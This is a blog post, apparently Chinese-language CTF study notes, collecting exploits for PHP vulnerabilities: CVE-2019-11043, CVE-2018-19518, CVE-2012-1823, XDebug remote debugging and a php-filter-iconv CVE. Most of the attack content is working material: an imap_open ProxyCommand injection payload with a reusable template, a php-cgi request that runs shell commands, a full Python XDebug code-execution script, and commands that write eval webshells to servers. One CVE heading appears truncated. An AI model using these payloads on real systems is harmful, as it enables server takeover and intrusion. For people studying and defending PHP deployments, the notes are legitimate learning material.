@@ -1,0 +1,143 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>php漏洞 · Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">php漏洞</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2025-03-10</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>1.SSRF漏洞<br>2.php7.1.33CVE-2019-11043，远程代码执行漏洞<br>该漏洞位于PHP-FPM模块的env_path_info函数，在特定的nginx + php-fpm配置中，web用户就可能会进行代码执行。该漏洞需要在nginx.conf中进行特定配置才能触发。配置如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">  ...</span><br><span class="line">  fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">  fastcgi_param PATH_INFO       $fastcgi_path_info;</span><br><span class="line">  fastcgi_pass   php:9000;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用%0a（换行符）来破坏正则，从而使得PATH_INFO为空</p>
+<p>利用条件： nginx配置了fastcgi_split_path_info</p>
+<p>受影响系统： PHP 5.6-7.x，Nginx&gt;&#x3D;0.7.31</p>
+<p>复现需要golang环境</p>
+<p>漏洞利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run . &quot;http://92cdd785-55c4-4b35-85fa-ae1dc7fdc367.challenge.ctf.show/index.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>3.PHP&#x2F;5.6.38CVE-2018-19518（远程命令执行漏洞）</p>
+<p>影响版本：PHP 5.6.x &lt; 5.6.39</p>
+<p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置-oProxyCommand&#x3D;来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 原始payload</span><br><span class="line">x+-oProxyCommand=echo    echo &#x27;&lt;?php eval($_POST[1]);&#x27; &gt; /var/www/html/1.php|base64    -d|sh&#125;</span><br><span class="line"></span><br><span class="line"># base64+url编码以后</span><br><span class="line">hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;</span><br><span class="line"></span><br><span class="line"># 模板</span><br><span class="line">hostname=x+-oProxyCommand%3decho%09【要执行命令的base64】|base64%09-d|sh&#125;&amp;username=xxx&amp;password=xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>4.受影响系统PHP &lt; 5.3.12 、 PHP &lt; 5.4.2:​ CVE-2012-1823是在php-cgi运行模式下出现的漏洞，其漏洞只出现在以cgi模式运行的php中。</p>
+<p>漏洞利用</p>
+<p>​ cgi模式下有如下可控命令行参数可用：</p>
+<p>-c 指定php.ini文件（PHP的配置文件）的位置<br>-n 不要加载php.ini文件<br>-d 指定配置项<br>-b 启动fastcgi进程<br>-s 显示文件源码<br>-T 执行指定次该文件<br>-h和-? 显示帮助<br>4.1那么最简单的利用方式就是?-s可以直接显示源码</p>
+<p>4.2一个更好的利用方法是通过使用-d指定auto_prepend_file来制造任意文件包含漏洞，执行任意代码：（其中用“+”代替了“空格”，并将“&#x3D;”和“:”进行了URL编码）</p>
+<p>​ 其原理是：利用可控命令行参数 -d 将allow_url_include 得值设为 on 并使用 auto_prepend_file 函数在页面顶部加载文件，而构造加载的文件为 php:&#x2F;&#x2F;input 读取的原始POST数据(也就是传输的数据 <?php echo shell_exec("ls");?> 的执行结果)，并传递到回应包里。构造请求包如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;?php echo shell_exec(&quot;ls&quot;);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>5.XDebug 远程调试漏洞,debug开启，端口9000</p>
+<p>条件：</p>
+<p>开启了远程调试模式，并设置<code>remote_connect_back = 1</code></p>
+<p>xdebug.remote_connect_back &#x3D; 1</p>
+<p>xdebug.remote_enable &#x3D; 1</p>
+<p>这个配置下，我们访问<a target="_blank" rel="noopener" href="http://target-url/index.php?XDEBUG_SESSION_START=phpstorm%EF%BC%8C%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84XDebug%E5%B0%86%E4%BC%9A%E8%BF%9E%E6%8E%A5%E8%AE%BF%E9%97%AE%E8%80%85%E7%9A%84IP%EF%BC%88%E6%88%96X-Forwarded-For%E5%A4%B4%E6%8C%87%E5%AE%9A%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%89%E5%B9%B6%E9%80%9A%E8%BF%87dbgp%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%85%B6%E9%80%9A%E4%BF%A1%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87dbgp%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84eval%E6%96%B9%E6%B3%95%E5%8D%B3%E5%8F%AF%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8FPHP%E4%BB%A3%E7%A0%81%E3%80%82">http://target-url/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</a><br>利用脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import socket</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(1)</span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def recv_xml(sock):</span><br><span class="line">    blocks = []</span><br><span class="line">    data = b&#x27;&#x27;</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            data = data + sock.recv(1024)</span><br><span class="line">        except socket.error as e:</span><br><span class="line">            break</span><br><span class="line">        if not data:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        while data:</span><br><span class="line">            eop = data.find(b&#x27;\x00&#x27;)</span><br><span class="line">            if eop &lt; 0:</span><br><span class="line">                break</span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+1:]</span><br><span class="line"></span><br><span class="line">        if len(blocks) &gt;= 4:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    return blocks[3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def trigger(url):</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    try:</span><br><span class="line">        session.get(url + &#x27;?XDEBUG_SESSION_START=phpstorm&#x27;, timeout=0.1)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;XDebug remote debug code execution.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, required=True, help=&#x27;the code you want to execute.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-t&#x27;, &#x27;--target&#x27;, required=True, help=&#x27;target url.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-l&#x27;, &#x27;--listen&#x27;, default=9000, type=int, help=&#x27;local port&#x27;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    ip_port = (&#x27;0.0.0.0&#x27;, args.listen)</span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.settimeout(10)</span><br><span class="line">    sk.bind(ip_port)</span><br><span class="line">    sk.listen(5)</span><br><span class="line"></span><br><span class="line">    pool.submit(trigger, args.target)</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    conn.sendall(b&#x27;&#x27;.join([b&#x27;eval -i 1 -- &#x27;, base64.b64encode(args.code.encode()), b&#x27;\x00&#x27;]))</span><br><span class="line"></span><br><span class="line">    data = recv_xml(conn)</span><br><span class="line">    print(&#x27;[+] Recieve data: &#x27; + data.decode())</span><br><span class="line">    g = re.search(rb&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;, data, re.I)</span><br><span class="line">    if not g:</span><br><span class="line">        print(&#x27;[-] No result...&#x27;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    data = g.group(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        print(&#x27;[+] Result: &#x27; + base64.b64decode(data).decode())</span><br><span class="line">    except binascii.Error:</span><br><span class="line">        print(&#x27;[-] May be not string result...&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当我们访问<code>/index.php?XDEBUG_SESSION_START=phpstorm</code>时，返回包会多出一个<code>Set-Cookie</code>，内容是<code>XDEBUG_SESSION=phpstorm;...</code>。</p>
+<p>执行payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t 【靶机url】/index.php -c &#x27;shell_exec(&quot;ls&quot;);&#x27; -l 9000</span><br></pre></td></tr></table></figure>
+
+<h2 id="敏感⽂件读取"><a href="#敏感⽂件读取" class="headerlink" title="敏感⽂件读取"></a>敏感⽂件读取</h2><p>第⼀种解法，有出过题的，⼤部分都是采⽤<a target="_blank" rel="noopener" href="https://github.com/CTF-Archives/ctf-docker-template%E8%BF%99%E2%BE%A5%E2%BE%AF%E7%9A%84%E6%A8%A1%E7%89%88%E3%80%82%E2%BC%80%E8%88%AC%E5%87%BA%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E4%B8%BA%E4%BA%86%E2%BD%85%E4%BE%BF%EF%BC%8C%E4%B8%8D%E5%8E%BB%E4%BF%AE%E6%94%B9dockerfile%E2%BD%82%E4%BB%B6%EF%BC%8C%E9%83%BD%E4%BC%9A%E7%9B%B4%E6%8E%A5%E5%9C%A8%E5%AE%B9%E5%99%A8%E5%86%85%E4%BF%AE%E6%94%B9%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8Dcommit%E2%BD%A3%E6%88%90%E9%95%9C%E5%83%8F%E3%80%82">https://github.com/CTF-Archives/ctf-docker-template这⾥⾯的模版。⼀般出题过程中，为了⽅便，不去修改dockerfile⽂件，都会直接在容器内修改，然后再commit⽣成镜像。</a> ⾥⾯的php出题模版中，有⼀个容器启动命令⽂件docker-entrypoint.sh。可以看到该命令⽂件在容器初始化后就会被删掉。但是在提交⽣成镜像后，由镜像⽣成容器⼜需要运⾏该⽂件。因此有的出题者为了⽅便可能就不删除该⽂件，这时候就可以碰碰运⽓，看看出题者有没有把这个⽂件删掉。没有删掉，就能够获取路径</p>
+<p>因此，在这⾥直接尝试读取docker-entrypoint.sh⽂件，可以发现该⽂件将flag变量输⼊到了&#x2F;f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jcl kej1wlkcj1lkwej1lkcwjellag。</p>
+<h2 id="CVE-2024-296"><a href="#CVE-2024-296" class="headerlink" title="CVE-2024-296"></a>CVE-2024-296</h2><p><a target="_blank" rel="noopener" href="https://github.com/kezibei/php-filter-iconv">GitHub - kezibei&#x2F;php-filter-iconv</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py http://1.1.1.1:8080/index.php &quot;echo &#x27;&lt;?=@eval(\$_POST[0]);?&gt;&#x27; &gt; 1.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>访问1.php执行命令</p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://1768161086.github,io">userq</a></p><p> <span>Link:  </span><a href="http://1768161086.github,io/2025/03/10/php%E6%BC%8F%E6%B4%9E/">http://1768161086.github,io/2025/03/10/php%E6%BC%8F%E6%B4%9E/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2025/03/10/XXE/" title="XXE"><span>< PreviousPost</span><br><span class="prevTitle">XXE</span></a><a class="nextSlogan" href="/2025/03/10/SSRF/" title="SSRF"><span>NextPost ></span><br><span class="nextTitle">SSRF</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E2%BD%82%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.</span> <span class="toc-text">敏感⽂件读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-296"><span class="toc-number">2.</span> <span class="toc-text">CVE-2024-296</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
